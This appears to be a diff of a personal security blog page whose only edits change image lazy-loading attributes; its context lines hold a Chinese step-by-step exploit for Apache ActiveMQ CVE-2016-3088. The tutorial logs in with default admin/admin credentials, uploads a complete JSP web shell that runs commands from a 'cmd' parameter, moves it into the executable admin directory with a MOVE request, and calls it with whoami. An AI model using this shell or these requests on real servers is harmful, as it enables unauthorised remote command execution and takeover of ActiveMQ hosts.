@@ -73,7 +73,7 @@
     https://www.cnblogs.com/skins/CodingLife/images/title-yellow.png)">
     <div class="main-header-box">
         <a class="header-avatar" href="/" title="K8gege">
-            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" data-original="/../images/avatar.png">
+            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" class="lazyload" data-src="/../images/avatar.png">
 			<h3 class="K8tilte">K8哥哥</h3>
         </a>
         <div class="branding">
@@ -210,25 +210,25 @@
 影响版本: Apache ActiveMQ 5.0.0 – 5.13.2<br></p>
 <h3 id="0x001-获取路径">0x001 获取路径</h3>
 <p>PUT /fileserver/%20/%20<br><br>
-<img alt="使用http访问查看图片" data-original="/k8img/Cscan/expbuild/ActiveMQGetShell1.PNG"></p>
+<img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Cscan/expbuild/ActiveMQGetShell1.PNG"></p>
 <h3 id="0x002-上传shell">0x002 上传shell</h3>
 <p>上传和移动文件需登陆,默认帐密admin/admin,将以下代码双引号进行转义(原本是转义好的被github过滤了)<br><br>
 PUT<br><br>
 AddUrl: /fileserver/cmd.jsp<br><br>
 PUTData: &lt;%@ page import="java.io.*"%&gt;&lt;%out.print("Hello");String strcmd = request.getParameter("cmd");String line =null;Process p=Runtime.getRuntime().exec(strcmd);InputStream is = p.getInputStream();BufferedReader br = new BufferedReader(new InputStreamReader(is));while((line =br.readLine())!=null){out.print(line+"");}%&gt;<br><br>
 Authorization: admin:admin<br><br>
-<img alt="使用http访问查看图片" data-original="/k8img/Cscan/expbuild/ActiveMQGetShell2.PNG"></p>
+<img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Cscan/expbuild/ActiveMQGetShell2.PNG"></p>
 <h3 id="0x003-移动shell">0x003 移动shell</h3>
 <p>根目录和fileserver均不解析JSP文件,好在admin和api目录可以解析<br><br>
 MOVE<br><br>
 AddUrl: /fileserver/cmd.jsp<br><br>
 Destination: file://C:/Users/null/Desktop/apache-activemq-5.9.0/webapps/admin/cmd.jsp<br><br>
-<img alt="使用http访问查看图片" data-original="/k8img/Cscan/expbuild/ActiveMQGetShell3.PNG"></p>
+<img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Cscan/expbuild/ActiveMQGetShell3.PNG"></p>
 <h3 id="0x004-Cscan调用">0x004 Cscan调用</h3>
-<p><img alt="使用http访问查看图片" data-original="/k8img/Cscan/expbuild/ActiveMQGetShell4.PNG"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Cscan/expbuild/ActiveMQGetShell4.PNG"></p>
 <h3 id="0x005-连接shell">0x005 连接shell</h3>
 <p>访问<a target="_blank" rel="noopener" href="http://192.168.1.26:8161/admin/shell.jsp?cmd=whoami">http://192.168.1.26:8161/admin/shell.jsp?cmd=whoami</a><br><br>
-<img alt="使用http访问查看图片" data-original="/k8img/Cscan/expbuild/ActiveMQGetShell5.PNG"></p>
+<img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Cscan/expbuild/ActiveMQGetShell5.PNG"></p>
 <h3 id="0x006-视频教程">0x006 视频教程</h3>
 <p>Video1: <a target="_blank" rel="noopener" href="https://github.com/k8gege/K8CScan/blob/master/Video/K8Cscan%20Apache%20ActiveMQ%20GetShell%20CVE-2016-3088.rar">K8Cscan Apache ActiveMQ GetShell CVE-2016-3088</a><br><br>
 Video2: <a target="_blank" rel="noopener" href="https://github.com/k8gege/K8CScan/blob/master/Video/K8Cscan%20WhatCMS%20GetShell.rar">WhatCMS指纹识别内网ActiveMQ&amp;GetShell</a></p>
@@ -237,7 +237,7 @@ Video2: <a target="_blank" rel="noopener" href="https://github.com/k8gege/K8CSca
     
     <div class="reward" ontouchstart="">
     <div class="reward-wrap">
-	<img height="180" width="180" data-original="../images/k8join2.png">
+	<img height="180" width="180" class="lazyload" data-src="../images/k8join2.png">
 
     </div>
     <p class="reward-tip">
